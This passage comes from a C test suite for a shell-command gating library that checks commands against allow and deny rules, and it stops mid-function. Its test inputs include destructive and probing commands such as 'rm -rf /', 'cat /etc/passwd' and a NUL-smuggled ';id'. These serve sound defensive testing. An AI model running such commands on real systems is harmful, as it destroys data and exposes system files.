#include "sg_anomaly.h"
#include "shell_abstract.h"
#include "shell_processor.h"
#include "shell_sequence.h"
#include "shell_tokenizer.h"
#include "shellgate.h"
#include "test_allocator.h"
#include "test_io.h"
#include "test_sg_failures.h"
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

/* shellgate_test links shellsplit_test so this regression can fault the
 * allocation made while building canonical anomaly netsequences. */
void shellsplit_test_alloc_fail_at(size_t allocation_index);
void shellsplit_test_alloc_reset(void);
size_t shellsplit_test_alloc_count(void);

static int pass_count = 0;
static int fail_count = 0;

#define ASSERT(cond)                                                           \
  do {                                                                         \
    if (!(cond)) {                                                             \
      printf("    FAIL: %s at %s:%d\n", #cond, __FILE__, __LINE__);            \
      fail_count++;                                                            \
      return;                                                                  \
    }                                                                          \
  } while (0)

#define ASSERT_EQ_INT(a, b)                                                    \
  do {                                                                         \
    if ((a) != (b)) {                                                          \
      printf("    FAIL: %s != %s (%ld != %ld) at %s:%d\n", #a, #b, (long)(a),  \
             (long)(b), __FILE__, __LINE__);                                   \
      fail_count++;                                                            \
      return;                                                                  \
    }                                                                          \
  } while (0)

#define ASSERT_EQ_UINT(a, b)                                                   \
  do {                                                                         \
    if ((a) != (b)) {                                                          \
      printf("    FAIL: %s != %s (%lu != %lu) at %s:%d\n", #a, #b,             \
             (unsigned long)(a), (unsigned long)(b), __FILE__, __LINE__);      \
      fail_count++;                                                            \
      return;                                                                  \
    }                                                                          \
  } while (0)

#define ASSERT_STR(a, b)                                                       \
  do {                                                                         \
    if (strcmp((a), (b)) != 0) {                                               \
      printf("    FAIL: %s != %s (\"%s\" != \"%s\") at %s:%d\n", #a, #b, (a),  \
             (b), __FILE__, __LINE__);                                         \
      fail_count++;                                                            \
      return;                                                                  \
    }                                                                          \
  } while (0)

#define ASSERT_NULL(ptr)                                                       \
  do {                                                                         \
    if ((ptr) != NULL) {                                                       \
      printf("    FAIL: %s should be NULL at %s:%d\n", #ptr, __FILE__,         \
             __LINE__);                                                        \
      fail_count++;                                                            \
      return;                                                                  \
    }                                                                          \
  } while (0)

#define ASSERT_NOT_NULL(ptr)                                                   \
  do {                                                                         \
    if ((ptr) == NULL) {                                                       \
      printf("    FAIL: %s should not be NULL at %s:%d\n", #ptr, __FILE__,     \
             __LINE__);                                                        \
      fail_count++;                                                            \
      return;                                                                  \
    }                                                                          \
  } while (0)
#define ASSERT_SG_OK(expression) ASSERT((expression) == SG_OK)

#define TEST(name) static void test_##name(void)
#define RUN(name)                                                              \
  do {                                                                         \
    printf("  %-40s ", #name);                                                 \
    int _pf = fail_count;                                                      \
    test_##name();                                                             \
    if (fail_count == _pf) {                                                   \
      printf("PASS\n");                                                        \
      pass_count++;                                                            \
    }                                                                          \
  } while (0)

#define MAX_TEMP_FILES 16

static char eval_buf[16384];
static char *temp_files[MAX_TEMP_FILES];
static int temp_file_count = 0;

static void cleanup_temp_files(void) {
  for (int i = 0; i < temp_file_count; i++) {
    if (temp_files[i]) {
      unlink(temp_files[i]);
      free(temp_files[i]);
      temp_files[i] = NULL;
    }
  }
  temp_file_count = 0;
}

static void register_temp_file(const char *path) {
  if (temp_file_count >= MAX_TEMP_FILES)
    return;
  temp_files[temp_file_count] = strdup(path);
  if (temp_files[temp_file_count] != NULL)
    temp_file_count++;
}

static const char *temp_policy_file(void) {
  static char path[256];
  snprintf(path, sizeof(path), "/tmp/shellgate-test-XXXXXX");
  int fd = mkstemp(path);
  if (fd < 0)
    return NULL;
  if (close(fd) != 0) {
    unlink(path);
    return NULL;
  }
  register_temp_file(path);
  return path;
}

static sg_gate_t *gate_with_rules(const char *const *rules, size_t count) {
  sg_gate_t *g = sg_gate_new();
  if (!g)
    return NULL;
  for (size_t i = 0; i < count; i++) {
    if (sg_gate_add_allow_cpl(g, rules[i]) != SG_OK) {
      sg_gate_free(g);
      return NULL;
    }
  }
  return g;
}

static sg_error_t add_exact_outer_rule(sg_gate_t *gate, const char *command) {
  shell_command_info_t *commands = NULL;
  size_t count = 0;
  if (shell_process_command(command, strlen(command), NULL, &commands,
                            &count) != SHELL_PROCESS_OK ||
      count == 0)
    return SG_ERR_PARSE;
  char *netargv = NULL;
  if (shell_render_netargv(&commands[0], NULL, &netargv) != SHELL_PROCESS_OK) {
    shell_command_infos_free(commands, count);
    return SG_ERR_PARSE;
  }
  st_token_array_t tokens = {0};
  st_error_t error = st_netargv_classify(netargv, &tokens);
  char *netpattern = NULL, *cpl = NULL;
  if (error == ST_OK) {
    for (size_t i = 0; i < tokens.count; i++)
      tokens.tokens[i].type = ST_TYPE_LITERAL;
    error = st_netpattern_encode(tokens.tokens, tokens.count, &netpattern);
  }
  if (error == ST_OK)
    error = st_netpattern_to_cpl(netpattern, &cpl);
  sg_error_t result =
      error == ST_OK ? sg_gate_add_allow_cpl(gate, cpl) : SG_ERR_PARSE;
  free(cpl);
  free(netpattern);
  st_token_array_free(&tokens);
  free(netargv);
  shell_command_infos_free(commands, count);
  return result;
}

static sg_error_t eval_cmd(sg_gate_t *g, const char *cmd, sg_result_t *r) {
  memset(eval_buf, 0, sizeof(eval_buf));
  return sg_gate_evaluate(g, cmd, strlen(cmd), eval_buf, sizeof(eval_buf), r);
}

/* --- LIFECYCLE --- */

TEST(gate_api_contract_matrix) {
  sg_test_alloc_fail_at(1);
  ASSERT(sg_gate_new() == NULL);
  sg_test_alloc_reset();

  st_test_alloc_reset();
  sg_gate_t *allocation_probe = sg_gate_new();
  ASSERT(allocation_probe != NULL);
  size_t construction_allocations = st_test_alloc_count();
  st_test_alloc_reset();
  sg_gate_free(allocation_probe);
  ASSERT(construction_allocations > 0);
  for (size_t fail_at = 1; fail_at <= construction_allocations; fail_at++) {
    st_test_alloc_fail_at(fail_at);
    allocation_probe = sg_gate_new();
    st_test_alloc_reset();
    ASSERT(allocation_probe == NULL);
  }

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(!sg_gate_anomaly_had_error(NULL));
  ASSERT(!sg_gate_anomaly_had_error(g));
  sg_gate_free(NULL);
  ASSERT(sg_gate_allow_rule_count(NULL) == 0);
  ASSERT(sg_gate_deny_rule_count(NULL) == 0);
  ASSERT(sg_gate_load_policy(NULL, "/tmp/unused") == SG_ERR_INVALID);
  ASSERT(sg_gate_load_policy(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_save_policy(NULL, "/tmp/unused") == SG_ERR_INVALID);
  ASSERT(sg_gate_save_policy(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(NULL, "ls", 2, NULL, 64, NULL) == SG_ERR_INVALID);
  ASSERT_SG_OK(sg_gate_add_allow_cpl(g, "ls"));
  char buf[64];
  sg_result_t r;

  ASSERT(sg_gate_evaluate(g, NULL, 2, buf, sizeof(buf), &r) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "ls", 0, buf, sizeof(buf), &r) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "ls", 2, NULL, sizeof(buf), &r) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "ls", 2, buf, 0, &r) == SG_ERR_INVALID);
  ASSERT(sg_gate_evaluate(g, "", 0, buf, sizeof(buf), &r) == SG_ERR_INVALID);
  static const char embedded_nul[] = {'l', 's', '\0', ';', 'i', 'd'};
  ASSERT(sg_gate_evaluate(g, embedded_nul, sizeof(embedded_nul), buf,
                          sizeof(buf), &r) == SG_ERR_INVALID);

  sg_gate_free(g);
}

TEST(setter_matrix) {
  static const char *paths[] = {"/tmp", "/home/user"};
  static const sg_stop_mode_t modes[] = {SG_STOP_FIRST_FAIL, SG_STOP_FIRST_PASS,
                                         SG_STOP_FIRST_ALLOW,
                                         SG_STOP_FIRST_DENY, SG_EVAL_ALL};
  static const uint32_t masks[] = {0, UINT32_MAX, SG_REJECT_MASK_DEFAULT};
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++)
    ASSERT(sg_gate_set_cwd(g, paths[i]) == SG_OK);
  char long_cwd[513];
  memset(long_cwd, 'x', sizeof(long_cwd) - 1);
  long_cwd[sizeof(long_cwd) - 1] = '\0';
  ASSERT(sg_gate_set_cwd(g, "/stable") == SG_OK);
  ASSERT(sg_gate_set_cwd(g, long_cwd) == SG_ERR_TRUNC);
  for (size_t i = 0; i < sizeof(modes) / sizeof(modes[0]); i++)
    ASSERT(sg_gate_set_stop_mode(g, modes[i]) == SG_OK);
  for (size_t i = 0; i < sizeof(masks) / sizeof(masks[0]); i++)
    ASSERT(sg_gate_set_reject_mask(g, masks[i]) == SG_OK);
  ASSERT(sg_gate_set_suggestions(g, true) == SG_OK);
  ASSERT(sg_gate_set_suggestions(g, false) == SG_OK);
  ASSERT(sg_gate_set_expand_var_netargv(g, NULL, NULL) == SG_OK);
  ASSERT(sg_gate_set_expand_glob_netargv(g, NULL, NULL) == SG_OK);
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT(sg_gate_set_violation_config_borrowed(g, &config) == SG_OK);

  sg_violation_config_t malformed = config;
  malformed.download_cmd_count = SG_VIOL_MAX_NAMES + 1;
  ASSERT(sg_gate_set_violation_config_borrowed(g, &malformed) ==
         SG_ERR_INVALID);
  malformed = config;
  malformed.download_cmds[0] = NULL;
  ASSERT(sg_gate_set_violation_config_borrowed(g, &malformed) ==
         SG_ERR_INVALID);

  ASSERT(sg_gate_set_cwd(NULL, "/tmp") == SG_ERR_INVALID);
  ASSERT(sg_gate_set_cwd(g, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_stop_mode(NULL, SG_STOP_FIRST_FAIL) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_stop_mode(g, (sg_stop_mode_t)-1) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_stop_mode(g, (sg_stop_mode_t)(SG_EVAL_ALL + 1)) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_set_suggestions(NULL, true) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_reject_mask(NULL, 0) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_expand_var_netargv(NULL, NULL, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_expand_glob_netargv(NULL, NULL, NULL) == SG_ERR_INVALID);
  ASSERT(sg_gate_set_violation_config_borrowed(NULL, &config) ==
         SG_ERR_INVALID);
  ASSERT(sg_gate_set_violation_config_borrowed(g, NULL) == SG_ERR_INVALID);
  sg_gate_free(g);
}

/* --- BASIC EVALUATION --- */

TEST(basic_evaluation_matrix) {
  static const struct {
    const char *rules[2];
    const char *input;
    sg_verdict_t verdict;
    struct {
      const char *command;
      bool matches;
    } evaluated[2];
    size_t evaluated_count;
  } cases[] = {
      {{"ls"}, "ls", SG_VERDICT_ALLOW, {{"ls", true}}, 1},
      {{"echo \"two words\""},
       "echo 'two words'",
       SG_VERDICT_ALLOW,
       {{"echo 'two words'", true}},
       1},
      {{"printf \"\""},
       "printf ''",
       SG_VERDICT_ALLOW,
       {{"printf ''", true}},
       1},
      {{"ls"}, "rm -rf /", SG_VERDICT_UNDETERMINED, {{"rm -rf /", false}}, 1},
      {{"ls * *"},
       "ls -la /home",
       SG_VERDICT_ALLOW,
       {{"ls -la /home", true}},
       1},
      {{NULL}, "ls", SG_VERDICT_UNDETERMINED, {{"ls", false}}, 1},
      {{"ls", "sort"},
       "ls | sort",
       SG_VERDICT_ALLOW,
       {{"ls", true}, {"sort", true}},
       2},
      {{"ls"},
       "ls | rm",
       SG_VERDICT_UNDETERMINED,
       {{"ls", true}, {"rm", false}},
       2},
      {{"ls", "pwd"},
       "ls ; pwd",
       SG_VERDICT_ALLOW,
       {{"ls", true}, {"pwd", true}},
       2},
      {{"rm"},
       "rm -rf / && ls",
       SG_VERDICT_UNDETERMINED,
       {{"rm -rf /", false}, {"ls", false}},
       2},
      {{"ls"},
       "rm || ls",
       SG_VERDICT_UNDETERMINED,
       {{"rm", false}, {"ls", true}},
       2},
      {{"git * * *"},
       "git commit -m hello",
       SG_VERDICT_ALLOW,
       {{"git commit -m hello", true}},
       1},
      {{"cat #path"},
       "cat /etc/passwd",
       SG_VERDICT_ALLOW,
       {{"cat /etc/passwd", true}},
       1},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    size_t rule_count = cases[i].rules[0] ? 1 : 0;
    if (cases[i].rules[1])
      rule_count++;
    sg_gate_t *g = gate_with_rules(cases[i].rules, rule_count);
    ASSERT(g != NULL);

    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].input, &result) == SG_OK);
    ASSERT(result.verdict == cases[i].verdict);
    ASSERT(result.subcommand_count == cases[i].evaluated_count);
    ASSERT(!result.truncated);
    for (size_t j = 0; j < cases[i].evaluated_count; j++) {
      ASSERT(result.subcommands[j].display_command != NULL);
      ASSERT(result.subcommands[j].netargv != NULL);
      ASSERT(strlen(result.subcommands[j].netargv) ==
             result.subcommands[j].netargv_length);
      st_token_array_t decoded = {0};
      ASSERT(st_netargv_classify(result.subcommands[j].netargv, &decoded) ==
             ST_OK);
      ASSERT(decoded.count > 0);
      st_token_array_free(&decoded);
      ASSERT_STR(result.subcommands[j].display_command,
                 cases[i].evaluated[j].command);
      ASSERT(result.subcommands[j].matches == cases[i].evaluated[j].matches);
      ASSERT(result.subcommands[j].verdict == (cases[i].evaluated[j].matches
                                                   ? SG_VERDICT_ALLOW
                                                   : SG_VERDICT_UNDETERMINED));
    }
    if (i == 1)
      ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:two words,");
    if (i == 2)
      ASSERT_STR(result.subcommands[0].netargv, "6:printf,0:,");
    sg_gate_free(g);
  }

  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  sg_result_t result = {0};
  char diagnostic[32];
  ASSERT(sg_gate_evaluate(g, "foo() { echo x; }", 17, diagnostic,
                          sizeof(diagnostic), &result) == SG_ERR_PARSE);
  ASSERT(result.verdict == SG_VERDICT_REJECT);
  ASSERT(strcmp(diagnostic, "parse error") == 0);
  char truncated[4];
  ASSERT(sg_gate_evaluate(g, "{ echo x; }", 11, truncated, sizeof(truncated),
                          &result) == SG_ERR_TRUNC);
  ASSERT(result.truncated);
  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
  sg_gate_free(g);
}

/* --- FEATURE REJECTION --- */

TEST(conditional_substitution_matrix) {
  static const struct {
    const char *command;
    const char *outer_rule;
    const char *inner_rule;
    sg_verdict_t expected;
    bool conditional;
    uint32_t reject_mask;
    bool deny_inner;
  } cases[] = {
      {"echo $(whoami)", "echo *", "whoami", SG_VERDICT_ALLOW_CONDITIONAL, true,
       0, false},
      {"cat <(whoami)", "cat *", "whoami", SG_VERDICT_ALLOW, false, 0, false},
      {"echo $(whoami)", "echo *", NULL, SG_VERDICT_UNDETERMINED, true, 0,
       false},
      {"echo $(whoami)", "echo *", "whoami", SG_VERDICT_REJECT, false,
       (1u << 2), false},
      {"echo $(whoami)", "echo *", "whoami", SG_VERDICT_DENY, true, 0, true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_SG_OK(sg_gate_add_allow_cpl(g, cases[i].outer_rule));
    if (cases[i].inner_rule) {
      if (cases[i].deny_inner)
        ASSERT_SG_OK(sg_gate_add_deny_cpl(g, cases[i].inner_rule));
      else
        ASSERT_SG_OK(sg_gate_add_allow_cpl(g, cases[i].inner_rule));
    }
    if (cases[i].reject_mask)
      ASSERT_SG_OK(sg_gate_set_reject_mask(g, cases[i].reject_mask));
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(g, cases[i].command, &result));
    ASSERT(result.verdict == cases[i].expected);
    ASSERT(result.requires_substitution_evaluation == cases[i].conditional);
    if (cases[i].reject_mask == 0)
      ASSERT(result.has_dynamic_substitution_io);
    if (cases[i].conditional) {
      ASSERT(result.subcommand_count >= 2);
      bool linked = false;
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        linked |= result.subcommands[j].substitution_consumer_index >= 0;
      ASSERT(linked);
    }
    sg_gate_free(g);
  }
}

TEST(process_substitution_wildcard_policy) {
  static const char *const rules[] = {"cat", "cat *", "sort", "sort *",
                                      "cat #path"};
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(rules) / sizeof(rules[0]); i++)
    ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, rules[i]));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));

  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, "sort <(cat /tmp/a)", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT(result.subcommands[0].matches);
  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW);
  ASSERT(result.has_dynamic_substitution_io);

  ASSERT_SG_OK(eval_cmd(gate, "cat <(sort <(cat /tmp/a))", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT(result.subcommands[1].matches);
  ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);
  sg_gate_free(gate);
}

TEST(composition_verdict_matrix) {
  static const struct {
    const char *allow[3];
    size_t allow_count;
    const char *deny;
    uint32_t reject_mask;
    const char *command;
    sg_verdict_t verdict;
    size_t subcommands;
    bool conditional;
  } cases[] = {
      {{"ls", "pwd"}, 2, NULL, 0, "ls ; pwd", SG_VERDICT_ALLOW, 2, false},
      {{"ls", "pwd"}, 2, NULL, 0, "ls && pwd", SG_VERDICT_ALLOW, 2, false},
      {{"ls", "pwd"}, 2, NULL, 0, "ls || pwd", SG_VERDICT_ALLOW, 2, false},
      {{"ls", "sort"}, 2, NULL, 0, "ls | sort", SG_VERDICT_ALLOW, 2, false},
      {{"ls"}, 1, NULL, 0, "ls && rm", SG_VERDICT_UNDETERMINED, 2, false},
      {{"ls"}, 1, NULL, 0, "rm || ls", SG_VERDICT_UNDETERMINED, 2, false},
      {{"ls", "sort"}, 2, "sort", 0, "ls | sort", SG_VERDICT_DENY, 2, false},
      {{"echo *", "whoami"},
       2,
       NULL,
       0,
       "echo $(whoami)",
       SG_VERDICT_ALLOW_CONDITIONAL,
       2,
       true},
      {{"echo *", "pwd"},
       2,
       NULL,
       SHELL_FEAT_VARS,
       "echo $HOME ; pwd",
       SG_VERDICT_REJECT,
       1,
       false},
  };

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = gate_with_rules(cases[i].allow, cases[i].allow_count);
    ASSERT(gate != NULL);
    ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
    ASSERT_SG_OK(sg_gate_set_reject_mask(gate, cases[i].reject_mask));
    if (cases[i].deny)
      ASSERT_SG_OK(sg_gate_add_deny_cpl(gate, cases[i].deny));

    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == cases[i].verdict);
    if (result.subcommand_count != cases[i].subcommands) {
      fprintf(stderr, "composition row %zu: got %u subcommands, expected %zu\n",
              i, result.subcommand_count, cases[i].subcommands);
      fail_count++;
    }
    ASSERT(result.requires_substitution_evaluation == cases[i].conditional);
    ASSERT(!result.short_circuited && !result.truncated);
    sg_gate_free(gate);
  }
}

TEST(composition_metadata_matrix) {
  static const struct {
    const char *rules[3];
    size_t rule_count;
    const char *command;
    uint32_t count;
    uint16_t first_group_depth;
    bool first_backgrounded;
  } cases[] = {
      {{"echo one", "echo two"}, 2, "echo one & echo two", 2, 0, true},
      {{"echo one", "echo two"}, 2, "(echo one; echo two)", 2, 1, false},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = gate_with_rules(cases[i].rules, cases[i].rule_count);
    ASSERT(gate != NULL);
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, cases[i].command, &result));
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT(result.subcommand_count == cases[i].count);
    ASSERT(result.subcommands[0].group_depth == cases[i].first_group_depth);
    ASSERT(result.subcommands[0].backgrounded == cases[i].first_backgrounded);
    ASSERT(result.subcommands[1].group_depth == cases[i].first_group_depth);
    ASSERT(!result.subcommands[1].backgrounded);
    sg_gate_free(gate);
  }
}

TEST(compound_group_execution_context_contract) {
  static const char *rules[] = {"echo one", "echo two", "pwd", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, "{ echo one; echo two; } & pwd", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
  ASSERT(result.subcommands[0].backgrounded);
  ASSERT(result.subcommands[1].backgrounded);
  ASSERT(!result.subcommands[2].backgrounded);

  ASSERT_SG_OK(eval_cmd(gate, "{ echo one; echo two; } | cat", &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3);
  ASSERT(!result.subcommands[0].backgrounded);
  ASSERT(!result.subcommands[1].backgrounded);
  ASSERT(!result.subcommands[2].backgrounded);
  sg_gate_free(gate);
}

TEST(posix_brace_group_pipeline) {
  const char *command =
      "cd /workspace && { sleep 2; printf 'q'; } | ./clock > /tmp/clock.out";
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.subcommand_count == 3);
  ASSERT(!result.truncated && !result.short_circuited);
  ASSERT_STR(result.subcommands[0].display_command, "sleep 2");
  ASSERT_STR(result.subcommands[1].display_command, "printf 'q'");
  ASSERT_STR(result.subcommands[2].display_command, "./clock");
  ASSERT_STR(result.subcommands[0].netargv, "5:sleep,1:2,");
  ASSERT_STR(result.subcommands[1].netargv, "6:printf,1:q,");
  ASSERT_STR(result.subcommands[2].netargv, "7:./clock,");
  ASSERT(result.subcommands[0].group_depth == 1);
  ASSERT(result.subcommands[1].group_depth == 1);
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[2].group_kinds == SHELL_GROUP_NONE);
  sg_gate_free(gate);
}

TEST(posix_brace_group_sibling_pipeline_policy_contract) {
  const char *command =
      "{ printf left; } 3>/tmp/left | { cat; } 2>>/tmp/right && "
      "{ printf tail; }";
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 3);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,4:left,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[2].netargv, "6:printf,4:tail,");
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT(result.subcommands[i].group_depth == 1);
    ASSERT(result.subcommands[i].group_kinds == SHELL_GROUP_BRACE);
  }
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_policy_and_anomaly_contract) {
  const char *command = "{ echo '}'; printf two; } > /tmp/brace-group.out";
  const char *rules[] = {"echo *", "printf *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "4:echo,1:},");
  ASSERT_STR(result.subcommands[1].netargv, "6:printf,3:two,");
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_document_policy_contract) {
  const char *command = "{ printf one; cat; } <<'EOF'\n}\nEOF";
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT(result.subcommands[0].group_depth == 1);
  ASSERT(result.subcommands[1].group_depth == 1);
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_descriptor_document_policy_contract) {
  const char *command =
      "{ cat; cat; } 4<&0 5>&- <<-'EOF' 3>\"/tmp/trace file\" 6>&1\n"
      "\tpayload\n"
      "\tEOF\n";
  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/tmp/trace file";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  for (uint32_t i = 0; i < result.subcommand_count; i++) {
    ASSERT_STR(result.subcommands[i].netargv, "3:cat,");
    ASSERT(result.subcommands[i].group_depth == 1);
    ASSERT(result.subcommands[i].group_kinds == SHELL_GROUP_BRACE);
    ASSERT(result.subcommands[i].read_count == 1);
    ASSERT(result.subcommands[i].write_count == 1);
    ASSERT(result.subcommands[i].violation_type_flags &
           SG_VIOL_WRITE_SENSITIVE);
  }
  sg_gate_free(gate);
}

TEST(posix_brace_group_crlf_document_policy_contract) {
  const char *command = "{ printf one; cat; } <<'EOF'\r\n}\r\nEOF\r\n";
  const char *rules[] = {"printf *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "6:printf,3:one,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT(result.subcommands[0].group_depth == 1);
  ASSERT(result.subcommands[1].group_depth == 1);
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(!sg_gate_anomaly_had_error(gate));
  sg_gate_free(gate);
}

TEST(posix_brace_group_multiple_document_policy_contract) {
  const char *command = "{ cat; cat; } <<A <<-'B'\n"
                        "one\n"
                        "A\n"
                        "\ttwo\n"
                        "\tB\n";
  const char *rules[] = {"cat"};
  sg_gate_t *gate = gate_with_rules(rules, 1);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 100.0, NULL));

  sg_result_t result = {0};
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  ASSERT(result.subcommand_count == 2);
  ASSERT_STR(result.subcommands[0].netargv, "3:cat,");
  ASSERT_STR(result.subcommands[1].netargv, "3:cat,");
  ASSERT(result.subcommands[0].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(result.subcommands[1].group_kinds == SHELL_GROUP_BRACE);
  ASSERT(!sg_gate_anomaly_had_error(gate));
